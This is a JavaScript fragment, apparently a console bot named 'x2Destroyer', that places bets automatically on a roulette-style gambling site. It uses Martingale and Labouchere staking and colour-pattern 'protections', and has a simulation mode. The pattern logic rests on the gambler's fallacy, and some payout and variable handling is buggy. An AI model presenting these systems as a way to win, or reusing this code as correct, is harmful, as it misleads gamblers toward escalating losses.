    function secondsToHHMMSS(d) {
      d = Number(d);
      var h = Math.floor(d / 3600);
      var m = Math.floor(d % 3600 / 60);
      var s = Math.floor(d % 3600 % 60);
     
      return ((h > 0 ? h + ":" + (m < 10 ? "0" : "") : "") + m + ":" + (s < 10 ? "0" : "") + s);
    }
     
    /*function sleep() {
        var ms = Math.floor((Math.random() * 100) + 1);
        ms += Math.floor((Math.random() * 100) + 1);
        ms += Math.floor((Math.random() * 100) + 1);
        ms *= 100;
     
        return (new Promise(function(resolve, reject) {
          setTimeout(function() {
            resolve();
          }, ms);
        }));
      }*/
     
    function sleep(x) {
      return (new Promise(function(resolve, reject) {
        setTimeout(function() {
          resolve();
        }, x);
      }));
    }
     
     
    function bet(amount, rgb) {
      switch (rgb) {
        case 'r':
          sleep(10000).then(function() {
            betAmountInput.value = amount;
            redBetButton.click();
          });
          break;
        case 'g':
          sleep(5000).then(function() {
            betAmountInput.value = amount;
            greenBetButton.click();
          });
          break;
        case 'b':
          sleep(10000).then(function() {
            betAmountInput.value = amount;
            blackBetButton.click();
          });
          break;
      }
    }
     
     
    function getColorFromNumber(number) {
      if (number == 0)
        return 'g';
      else if (number >= 1 && number <= 7)
        return 'r';
      else if (number >= 8 && number <= 14)
        return 'b';
    }
     
    function toSignedInt(number) {
      if (number > 0)
        return "+" + number;
     
      return number
    }
     
    function calculateNewDefaultBet(defaultBet, moneyStart, money) {
      return Math.floor((defaultBet / moneyStart) * money);
    }
    //END [DEFINING FUNCTIONS]
     
    //START [MAIN LOOP]
    setInterval(function() {
      runtimeSpan.innerHTML = secondsToHHMMSS(++runtime);
     
      if (running) {
        fullStatus = checkStatus()
        switch (fullStatus.substring(0, 2)) {
          case "**":
            rolled = true;
            status = 1;
            break;
     
          case "Ro":
            if (betOnThisRound && rolled) {
              betOnThisRound = false;
              checkedIfWon = false;
              rolled = false;
            }
            status = 2;
            break;
     
          case "CS":
            status = 3;
            break;
     
          case "Co":
            status = 4;
            break;
     
          default:
            status = 0;
            break;
        }
        //if (status == 2)
        //  console.log("%c[x2Destroyer] Website Status: " + status + " // Rolling in XX.XX...", "color:orange;");
        //else
        // console.log("%c[x2Destroyer] Website Status: " + status + " // " + checkStatus(), "color:orange;");
     
        if (!betOnThisRound && status == 2) {
          skipBet = false;
          //decide which color to bet on
          if (!manualMode) {
            if (getColorFromNumber(document.getElementById("past").childNodes[9].innerHTML) != 'g') currBetColor = getColorFromNumber(document.getElementById("past").childNodes[9].innerHTML);
            else
              currBetColor = 'r';
     
            if (trainProtectionCheckbox.checked) {
              if ((getColorFromNumber(document.getElementById("past").childNodes[8].innerHTML) == 'r' && getColorFromNumber(document.getElementById("past").childNodes[9].innerHTML) == 'r') || (getColorFromNumber(document.getElementById("past").childNodes[8].innerHTML) == 'b' && getColorFromNumber(document.getElementById("past").childNodes[9].innerHTML) == 'b')) {
                console.log("%c[x2Destroyer] Train Detected!", "color:blue;");
                currBetColor = getColorFromNumber(document.getElementById("past").childNodes[9].innerHTML);
              }
            }
     
            if (rainbowProtectionCheckbox.checked) {
              if ((getColorFromNumber(document.getElementById("past").childNodes[7].innerHTML) == 'b' && (getColorFromNumber(document.getElementById("past").childNodes[8].innerHTML) == 'r') && getColorFromNumber(document.getElementById("past").childNodes[9].innerHTML) == 'b') || (getColorFromNumber(document.getElementById("past").childNodes[7].innerHTML) == 'r' && (getColorFromNumber(document.getElementById("past").childNodes[8].innerHTML) == 'b') && getColorFromNumber(document.getElementById("past").childNodes[9].innerHTML) == 'r')) {
                console.log("%c[x2Destroyer] Rainbow Detected!", "color:blue;");
                currBetColor = getColorFromNumber(document.getElementById("past").childNodes[8].innerHTML);
              }
            }
            if (rrbbProtectionCheckbox.checked) {
              if ((getColorFromNumber(document.getElementById("past").childNodes[6].innerHTML) == 'b' && getColorFromNumber(document.getElementById("past").childNodes[7].innerHTML) == 'b' && getColorFromNumber(document.getElementById("past").childNodes[8].innerHTML) == 'r' && getColorFromNumber(document.getElementById("past").childNodes[9].innerHTML) == 'r') || (getColorFromNumber(document.getElementById("past").childNodes[6].innerHTML) == 'r' && getColorFromNumber(document.getElementById("past").childNodes[7].innerHTML) == 'r' && getColorFromNumber(document.getElementById("past").childNodes[8].innerHTML) == 'b' && getColorFromNumber(document.getElementById("past").childNodes[9].innerHTML) == 'b')) {
                console.log("%c[x2Destroyer] RRBB Pattern Detected!", "color:blue;");
                currBetColor = getColorFromNumber(document.getElementById("past").childNodes[6].innerHTML);
              }
            }
            if (rrbProtectionCheckbox.checked) {
              if ((getColorFromNumber(document.getElementById("past").childNodes[7].innerHTML) == 'b' && getColorFromNumber(document.getElementById("past").childNodes[8].innerHTML) == 'b' && getColorFromNumber(document.getElementById("past").childNodes[9].innerHTML) == 'r') || (getColorFromNumber(document.getElementById("past").childNodes[7].innerHTML) == 'r' && getColorFromNumber(document.getElementById("past").childNodes[8].innerHTML) == 'r' && getColorFromNumber(document.getElementById("past").childNodes[9].innerHTML) == 'b')) {
                console.log("%c[x2Destroyer] RRB Pattern Detected!", "color:blue;");
                currBetColor = getColorFromNumber(document.getElementById("past").childNodes[7].innerHTML);
              }
            }
          }
     
          if (mode == 0 && !manualMode) { //Martingale System
            if (nightengaleStopAfterXGamesCheckbox.checked && (betsWon + betsLost) == parseInt(nightengaleStopAfterXGamesInput.value)) {
              stopButton.click();
              console.log("%c[x2Destroyer] Nightengale: Stop after " + nightengaleStopAfterXGamesInput.value + " reached! Stopping...: ", "color:purple");
            }
     
            if (nightengaleStopAfterReachingXCheckbox.checked && ((!simulationMode && ((getBalance() - startBalance) == parseInt(nightengaleStopAfterReachingXInput.value))) || (simulationMode && ((simulationMoney - simulationMoneyStart) == parseInt(nightengaleStopAfterReachingXInput.value))))) {
              stopButton.click();
              console.log("%c[x2Destroyer] Nightengale: Stop after attaining " + nightengaleStopAfterReachingXInput.value + " reached! Stopping...: ", "color:purple");
            }
     
            //decide the amount to bet
            if (antiDoubleGreenCounter == 0)
              antiDoubleGreenCounter = -1;
     
            if (!betOnThisRound && wonLastBet) {
              currBetAmount = parseInt(nightengaleDefaultBetInput.value);
              if (betOnGreenEnabled)
                currBetGreenAmount = parseInt(nightengaleBetOnGreenInput.value);
              antiLoseAllCounter = 0;
     
            } else if (antiDoubleGreenCounter == -1 && !betOnThisRound && antiDoubleGreenEnabled && getColorFromNumber(document.getElementById("past").childNodes[9].innerHTML) == 'g') {
              antiDoubleGreenCounter = parseInt(nightengaleAntiDoubleGreenInput.value);
              console.log("%c[x2Destroyer] Skipping the next " + antiDoubleGreenCounter + " bets!", "color:green");
              skipBet = true;
              betOnThisRound = true;
              antiDoubleGreenCounter -= 1;
            } else if (!betOnThisRound && antiDoubleGreenCounter >= 0) {
              if (antiDoubleGreenCounter == 1) {
                console.log("%c[x2Destroyer] Last bet skip!", "color:green");
                antiDoubleGreenCounter = -1;
                skipBet = true;
                betOnThisRound = true;
              } else if (!skipBet && !betOnThisRound) {
                console.log("%c[x2Destroyer] Skipping the next " + antiDoubleGreenCounter + " bets", "color:green");
                betOnThisRound = true;
                skipBet = true;
                antiDoubleGreenCounter -= 1;
              }
            } else {
              antiLoseAllCounter++;
              if (antiBankruptcy && ((simulationMode && (lastBetAmount * 2 > simulationMoney)) || (!simulationMode && (lastBetAmount * 2 > getBalance())))) {
                console.log("%c[x2Destroyer] Anti-Bankruptcy triggered!", "color:blue;");
     
                if (simulationMode) {
                  nightengaleDefaultBetInput.value = calculateNewDefaultBet(nightengaleDefaultBetInput.value, simulationMoneyStart, simulationMoney);
                  console.log("%c[x2Destroyer] Anti-Bankruptcy calculated new default bet: " + nightengaleDefaultBetInput.value, "color:blue;");
                } else {
                  nightengaleDefaultBetInput.value = calculateNewDefaultBet(nightengaleDefaultBetInput.value, startBalance, getBalance());
                  console.log("%c[x2Destroyer] Anti-Bankruptcy calculated new default bet: " + nightengaleDefaultBetInput.value, "color:blue;");
                }
     
                currBetAmount = parseInt(nightengaleDefaultBetInput.value);
                if (betOnGreenEnabled)
                  currGreenBetAmount = parseInt(nightengaleBetOnGreenInput.value);
                wonLastBet = true;
              } else {
                if (antiLoseAllCounter >= parseInt(nightengaleAntiLoseallInput.value)) {
                  antiLoseAllCounter = 0;
                  console.log("%c[x2Destroyer] Anti-Lose all triggered!", "color:green");
                  currBetAmount = parseInt(nightengaleDefaultBetInput.value);
                  if (betOnGreenEnabled)
                    currGreenBetAmount = parseInt(nightengaleBetOnGreenInput.value);
                } else {
                  currBetAmount = lastBetAmount * 2;
                  if (betOnGreenEnabled)
                    currBetGreenAmount = lastBetGreenAmount * 2;
                }
              }
     
            }
          }
        } else if (mode == 1 && !manualMode) { //labouchere system
          if (simulationMode) {
            if ((simulationMoney - simulationMoneyStart) == goal) {
              stopButton.click();
              console.log("%c[x2Destroyer] Labouchere goal reached! Stopping...: ", "color:purple");
            }
          } else {
            if ((getBalance() - startBalance) == goal) {
              stopButton.click();
              console.log("%c[x2Destroyer] Labouchere goal reached! Stopping...: ", "color:purple");
            }
          }
     
          if (wonLastBet && (betsWon + betsLost) > 0) {
            lines.splice((lines.length - 1), 1);
            lines.splice(0, 1);
          } else if (!wonLastBet && (betsWon + betsLost) > 0) {
            lines.push(lastBetAmount);
          }
     
          if (lines.length > 1)
            currBetAmount = (lines[0] + lines[lines.length - 1]);
          else
            currBetAmount = lines[0];
     
          console.log("%c[x2Destroyer] Lines: " + lines, "color:blue");
        }
     
        //bet
        if (!skipBet) {
     
          //////////////////////////////////////////////////////
          if (currBetColor == 'r') {
            resultcolor = "RED";
          } else if (currBetColor == 'b') {
            resultcolor = "BLACK";
          } else if (currBetColor == 'g') {
            resultcolor = "GREEN";
          }
          //////////////////////////////////////////////////////
     
          if (!simulationMode && !betOnThisRound) {
            betOnThisRound = true;
            lastBetAmount = currBetAmount;
            lastBetGreenAmount = currBetGreenAmount;
     
     
            //bet on green part
            if (betOnGreenEnabled) {
              console.log("%c[x2Destroyer] Total Money: " + getBalance() + " // Total Bets: " + (betsWon + betsLost) + " // Wins: " + betsWon + " Losses: " + betsLost + " // Net Change: " + toSignedInt(getBalance() - startBalance) + " // Bet of " + currBetGreenAmount + " credits on GREEN", "color:purple;");
              bet(currBetGreenAmount, 'g');
            }
     
     
     
     
            console.log("%cTotal Money: " + getBalance() + " // Total Bets: " + (betsWon + betsLost) + " // Wins: " + betsWon + " Losses: " + betsLost + " // Max WinStreak: " + maxwinstreak + " // Max LoseStreak: " + maxlosestreak + " // Net Change: " + toSignedInt(getBalance() - startBalance) + " // Bet " + currBetAmount + " on " + resultcolor + " // Current " + winorlosestreak + ": " + currstreak, "color:purple;");
            bet(currBetAmount, currBetColor);
          } else if (simulationMode && !manualMode && !betOnThisRound) {
            betOnThisRound = true;
            lastBetAmount = currBetAmount;
            lastBetGreenAmount = currBetGreenAmount;
     
            console.log("%cTotal Money: " + simulationMoney + " // Total Bets: " + (betsWon + betsLost) + " // Wins: " + betsWon + " Losses: " + betsLost + " // Max WinStreak: " + maxwinstreak + " // Max LoseStreak: " + maxlosestreak + " // Net Change: " + toSignedInt(simulationMoney - simulationMoneyStart) + " // Simulated Bet " + currBetAmount + " on " + resultcolor + " // Current " + winorlosestreak + ": " + currstreak, "color:purple;");
            //console.log("%c[x2Destroyer] Total Money: " + simulationMoney, "color:purple;");
            //console.log("%cTotal Bets: " + (betsWon + betsLost), "color:purple;");
            //console.log("%cWins: " + betsWon + " Losses: " + betsLost, "color:purple;");
            //console.log("%cNet Change: " + toSignedInt(simulationMoney - simulationMoneyStart), "color:purple;");
            //console.log("%cSimulated Bet of " + currBetAmount, "color:purple;");
            //console.log("%cMax WinStreak: " + maxwinstreak, "color:purple;");
            //console.log("%cMax LoseStreak: " + maxlosestreak, "color:purple;");
            //console.log("%cCurrent "+ winorlosestreak +": " + currstreak, "color:purple;");
            //console.log("%cBet on color " + currBetColor, "color:purple;");
            if (betOnGreenEnabled)
              console.log("%c[x2Destroyer] Total Money: " + simulationMoney + " // Total Bets: " + (betsWon + betsLost) + " // Wins: " + betsWon + " Losses: " + betsLost + " // Net Change: " + toSignedInt(simulationMoney - simulationMoneyStart) + " // Simulated Bet of " + currBetGreenAmount + " credits on GREEN", "color:purple;");
          }
     
          if (!checkedIfWon && betOnThisRound && status == 3) {
            if ((betOnGreenEnabled && getColorFromNumber(checkStatus().substring(18, checkStatus().length - 1)) == 'g') || currBetColor == getColorFromNumber(checkStatus().substring(18, checkStatus().length - 1))) {
              wonLastBet = true;
     
              //////////////////////////////////////////
              wstreak = 1;
              currstreak++;
              maxlose = 0;
              maxwin++;
              if (maxwin > maxwinstreak) {
                maxwinstreak++;
              }
              if (lstreak > 0) {
                currstreak = 1;
              }
              lstreak = 0;
              winorlosestreak = "Winstreak";
              //////////////////////////////////////////
     
              betsWon++;
              console.log("%c[x2Destroyer] Won Last Bet! :D", "color:green;");
              if (simulationMode) {
                if (betOnGreenEnabled && getColorFromNumber(checkStatus().substring(18, checkStatus().length - 1)) == 'g')
                  simulationMoney += currBetGreenAmount * 14;
                else if (betOnGreenEnabled && getColorFromNumber(checkStatus().substring(18, checkStatus().length - 1)) != 'g')
                  simulationMoney -= currBetGreenAmount;
     
                if (currBetColor != 'g') {
                  if (currBetColor == getColorFromNumber(checkStatus().substring(18, checkStatus().length - 1)))
                    simulationMoney += currBetAmount;
                } else {
                  if (!(currBetColor == getColorFromNumber(checkStatus().substring(18, checkStatus().length - 1))))
                    simulationMoney += 14 * currBetAmount;
                }
              }
            } else {
              wonLastBet = false;
     
              //////////////////////////////////////////
              lstreak = 1;
              currstreak++;
              maxwin = 0;
              maxlose++;
              if (maxlose > maxlosestreak) {
                maxlosestreak++;
              }
              if (wstreak > 0) {
                currstreak = 1;
              }
              wstreak = 0;
              winorlosestreak = "Losestreak";
              //////////////////////////////////////////
     
              betsLost++;
              console.log("%c[x2Destroyer] Lost Last Bet! :(", "color:red;");
              if (simulationMode) {
                if (betOnGreenEnabled && getColorFromNumber(checkStatus().substring(18, checkStatus().length - 1)) != 'g')
                  simulationMoney -= currBetGreenAmount;
                else if (betOnGreenEnabled && getColorFromNumber(checkStatus().substring(18, checkStatus().length - 1)) == 'g')
                  simulationMoney += currBetGreenAmount * 14;
     
                if (!(currBetColor == getColorFromNumber(checkStatus().substring(18, checkStatus().length - 1))))
                  simulationMoney -= currBetAmount;
              }
            }
     
            checkedIfWon = true;
          }
        } else if (!betOnThisRound && skipBet) {
          console.log("%c[x2Destroyer] Skipping bet! :)", "color:green");
        }
      }
    }, 1000);
    //END [MAIN LOOP]